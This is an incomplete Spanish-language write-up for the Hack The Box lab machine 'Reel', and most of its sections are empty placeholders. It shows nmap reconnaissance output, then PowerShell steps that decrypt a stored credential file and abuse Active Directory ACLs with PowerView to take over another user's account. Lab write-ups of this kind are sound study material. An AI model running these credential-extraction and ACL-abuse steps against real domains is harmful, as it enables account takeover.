# Reel

## Tabla de Contenido <!-- omit from toc -->

- [Introducción](#introducción)
  - [Técnicas vistas / Tags](#técnicas-vistas--tags)
  - [Estadísticas](#estadísticas)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de host](#escaneo-de-host)
    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
    - [Escaneo específico](#escaneo-específico)
- [Enumeración](#enumeración)
  - [Servicios](#servicios)
    - [Nombre de servicio - Puerto](#nombre-de-servicio---puerto)
      - [Manual](#manual)
      - [Nombre de herramienta](#nombre-de-herramienta)
- [Explotación](#explotación)
  - [Tipo de explotación](#tipo-de-explotación)
    - [Pasos previos | Preparación](#pasos-previos--preparación)
    - [Ejecución](#ejecución)
- [Post Explotación](#post-explotación)
  - [Enumeración](#enumeración-1)
  - [Escalación de privilegios](#escalación-de-privilegios)
- [Conclusión](#conclusión)
- [Notas adicionales](#notas-adicionales)
- [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- Técnica 1
- Técnica 2
- Técnica 3

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Reel]() |
| OS | Windows |
| Dificultad oficial | Hard |
| Dificultad de comunidad | ![Dificultad]() |
| Puntos | 40 |
| Creadores | [Creator]() |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -T5 --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-01 21:33 EDT
Initiating SYN Stealth Scan at 21:33
Scanning 10.10.10.77 [65535 ports]
Discovered open port 25/tcp on 10.10.10.77
Discovered open port 21/tcp on 10.10.10.77
Discovered open port 139/tcp on 10.10.10.77
Discovered open port 445/tcp on 10.10.10.77
Discovered open port 135/tcp on 10.10.10.77
Discovered open port 22/tcp on 10.10.10.77
Discovered open port 49159/tcp on 10.10.10.77
Discovered open port 593/tcp on 10.10.10.77
Completed SYN Stealth Scan at 21:34, 26.34s elapsed (65535 total ports)
Nmap scan report for 10.10.10.77
Host is up (0.077s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds
           Raw packets sent: 131080 (5.768MB) | Rcvd: 26 (1.144KB)
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 21,22,25,135,139,445,593,49159 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-01 21:34 EDT
Nmap scan report for 10.10.10.77
Host is up (0.15s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello:
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help:
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie:
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.92%I=7%D=5/1%Time=645068B8%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-05-02T01:37:41
|_  start_date: 2023-05-02T01:31:54
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-05-02T02:37:38+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.48 seconds
```

## Enumeración

### Servicios

#### Nombre de servicio - Puerto

##### Manual



##### Nombre de herramienta



## Explotación

### Tipo de explotación

#### Pasos previos | Preparación



#### Ejecución



## Post Explotación

### Enumeración

```powershell
powershell -c "$cred = Import-CliXml -Path .\desktop\cred.xml; $cred.GetNetworkCredential() | Format-List "


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB

c:\Users\nico>
```

```powershell
Get-DomainPolicyData -Policy all -Server reel.htb.local -Domain htb.local | Export-CliXML gpo.xml
```

```powershell
PS C:\Users\tom\Desktop\AD Audit\bloodhound> $userPassword = 'Sup3rS3cr3t!'
PS C:\Users\tom\Desktop\AD Audit\bloodhound> $secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
PS C:\Users\tom\Desktop\AD Audit\bloodhound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom
PS C:\Users\tom\Desktop\AD Audit\bloodhound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
PS C:\Users\tom\Desktop\AD Audit\bloodhound> Set-DomainUserPassword -identity claire -accountpassword $secStringPassword


$userPassword = 'Sup3rS3cr3t!'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
Set-DomainObjectOwner -identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
Set-DomainUserPassword -identity claire -accountpassword $secStringPassword


```


### Escalación de privilegios


## Conclusión


## Notas adicionales


## Referencias

